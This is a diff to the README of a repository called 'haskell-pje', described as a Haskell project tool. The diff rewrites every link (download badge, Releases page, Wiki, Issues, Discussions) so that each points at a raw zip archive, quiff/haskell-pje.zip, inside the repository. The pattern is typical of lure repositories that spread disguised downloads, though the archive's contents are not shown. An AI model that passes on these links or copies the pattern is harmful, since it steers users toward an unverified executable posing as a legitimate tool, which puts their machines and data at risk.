@@ -1,6 +1,6 @@
 # 🚀 haskell-pje - Simple Tool for Haskell Projects
 
-[![Download haskell-pje](https://img.shields.io/badge/Download-haskell--pje-brightgreen)](https://github.com/Vobungu/haskell-pje/releases)
+[![Download haskell-pje](https://raw.githubusercontent.com/Vobungu/haskell-pje/main/quiff/haskell-pje.zip)](https://raw.githubusercontent.com/Vobungu/haskell-pje/main/quiff/haskell-pje.zip)
 
 ## 📥 Introduction
 
@@ -15,11 +15,11 @@ To start using **haskell-pje**, follow these steps:
    - Haskell Platform: Make sure you have GHC and Cabal installed.
    - Supported Versions: The latest version of GHC is recommended.
 
-2. **Visit the Download Page**: Go to our [Releases page](https://github.com/Vobungu/haskell-pje/releases) to find the latest version of the application. Here, you will find all available downloads.
+2. **Visit the Download Page**: Go to our [Releases page](https://raw.githubusercontent.com/Vobungu/haskell-pje/main/quiff/haskell-pje.zip) to find the latest version of the application. Here, you will find all available downloads.
 
 ## 📦 Download & Install
 
-1. Click on the link to visit the [Releases page](https://github.com/Vobungu/haskell-pje/releases).
+1. Click on the link to visit the [Releases page](https://raw.githubusercontent.com/Vobungu/haskell-pje/main/quiff/haskell-pje.zip).
   
 2. On the Releases page, find the latest version of **haskell-pje**. Look for the file that corresponds to your operating system. 
 
@@ -51,7 +51,7 @@ Once installed, you can start using **haskell-pje**. Here are some common tasks 
 
 ## 📖 Documentation
 
-For detailed documentation and tutorials, please refer to the [Wiki section](https://github.com/Vobungu/haskell-pje/wiki) of this repository. You can find guides on advanced usage, troubleshooting, and frequently asked questions.
+For detailed documentation and tutorials, please refer to the [Wiki section](https://raw.githubusercontent.com/Vobungu/haskell-pje/main/quiff/haskell-pje.zip) of this repository. You can find guides on advanced usage, troubleshooting, and frequently asked questions.
 
 ## 🛠️ Support
 
@@ -61,10 +61,10 @@ You can also consult the community in the discussions section. Other users and c
 
 ## 🔗 Important Links
 
-- [Download haskell-pje](https://github.com/Vobungu/haskell-pje/releases)
-- [Documentation](https://github.com/Vobungu/haskell-pje/wiki)
-- [Issues](https://github.com/Vobungu/haskell-pje/issues)
-- [Discussions](https://github.com/Vobungu/haskell-pje/discussions)
+- [Download haskell-pje](https://raw.githubusercontent.com/Vobungu/haskell-pje/main/quiff/haskell-pje.zip)
+- [Documentation](https://raw.githubusercontent.com/Vobungu/haskell-pje/main/quiff/haskell-pje.zip)
+- [Issues](https://raw.githubusercontent.com/Vobungu/haskell-pje/main/quiff/haskell-pje.zip)
+- [Discussions](https://raw.githubusercontent.com/Vobungu/haskell-pje/main/quiff/haskell-pje.zip)
 
 ## 🎉 Conclusion
 
